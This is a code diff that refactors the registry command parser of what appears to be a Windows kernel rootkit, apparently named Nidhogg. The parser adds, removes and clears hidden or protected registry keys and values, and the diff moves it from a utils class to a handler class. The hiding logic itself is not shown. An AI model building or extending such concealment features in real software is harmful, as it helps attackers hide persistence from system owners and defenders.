@@ -1,6 +1,6 @@
 #include "pch.h"
 #include "RegistryParser.h"
-#include "RegistryUtils.h"
+#include "RegistryHandler.h"
 
 RegistryParser::RegistryParser() {
 	this->optionsSize = 5;
@@ -28,8 +28,7 @@ RegistryParser::RegistryParser() {
 * @status	 [NTSTATUS] -- Result of the command.
 */
 NTSTATUS RegistryParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
-	RegItem regItem{};
-	ULONG itemsCount = 0;
+	RegItem regItem = { 0 };
 	UNICODE_STRING wKeyName = { 0 };
 	UNICODE_STRING wValueName = { 0 };
 	NTSTATUS status = STATUS_SUCCESS;
@@ -87,26 +86,15 @@ NTSTATUS RegistryParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 	case Options::Hide:
 	{
 		if (commandId == Options::Add) {
-			regItem.Type = regItem.ValueName ? RegProtectedValue : RegProtectedKey;
-			itemsCount = regItem.Type == RegProtectedValue ? NidhoggRegistryUtils->GetProtectedValuesCount() :
-				NidhoggRegistryUtils->GetProtectedKeysCount();
+			regItem.Type = regItem.ValueName ? RegItemType::ProtectedValue : RegItemType::ProtectedKey;
 		}
 		else {
-			regItem.Type = regItem.ValueName ? RegHiddenValue : RegHiddenKey;
-			itemsCount = regItem.Type == RegProtectedValue ? NidhoggRegistryUtils->GetHiddenValuesCount() :
-				NidhoggRegistryUtils->GetHiddenKeysCount();
-		}
-		
-		if (itemsCount == MAX_REG_ITEMS) {
-			status = STATUS_TOO_MANY_CONTEXT_IDS;
-			break;
+			regItem.Type = regItem.ValueName ? RegItemType::HiddenValue : RegItemType::HiddenKey;
 		}
 
-		if (!NidhoggRegistryUtils->FindRegItem(&regItem)) {
-			if (!NidhoggRegistryUtils->AddRegItem(&regItem)) {
-				status = STATUS_UNSUCCESSFUL;
-				break;
-			}
+		if (!NidhoggRegistryHandler->AddRegItem(regItem)) {
+			status = STATUS_UNSUCCESSFUL;
+			break;
 		}
 		break;
 	}
@@ -114,22 +102,13 @@ NTSTATUS RegistryParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 	case Options::Unhide:
 	{
 		if (commandId == Options::Remove) {
-			regItem.Type = regItem.ValueName ? RegProtectedValue : RegProtectedKey;
-			itemsCount = regItem.Type == RegProtectedValue ? NidhoggRegistryUtils->GetProtectedValuesCount() :
-				NidhoggRegistryUtils->GetProtectedKeysCount();
+			regItem.Type = regItem.ValueName ? RegItemType::ProtectedValue : RegItemType::ProtectedKey;
 		}
 		else {
-			regItem.Type = regItem.ValueName ? RegHiddenValue : RegHiddenKey;
-			itemsCount = regItem.Type == RegProtectedValue ? NidhoggRegistryUtils->GetHiddenValuesCount() :
-				NidhoggRegistryUtils->GetHiddenKeysCount();
+			regItem.Type = regItem.ValueName ? RegItemType::HiddenValue : RegItemType::HiddenKey;
 		}
 
-		if (itemsCount == 0) {
-			status = STATUS_NOT_FOUND;
-			break;
-		}
-
-		if (!NidhoggRegistryUtils->RemoveRegItem(&regItem)) {
+		if (!NidhoggRegistryHandler->RemoveRegItem(regItem)) {
 			status = STATUS_NOT_FOUND;
 			break;
 		}
@@ -137,7 +116,7 @@ NTSTATUS RegistryParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 	}
 	case Options::Clear:
 	{
-		NidhoggRegistryUtils->ClearRegItems();
+		NidhoggRegistryHandler->ClearRegistryList(RegItemType::All);
 		break;
 	}
 	default:
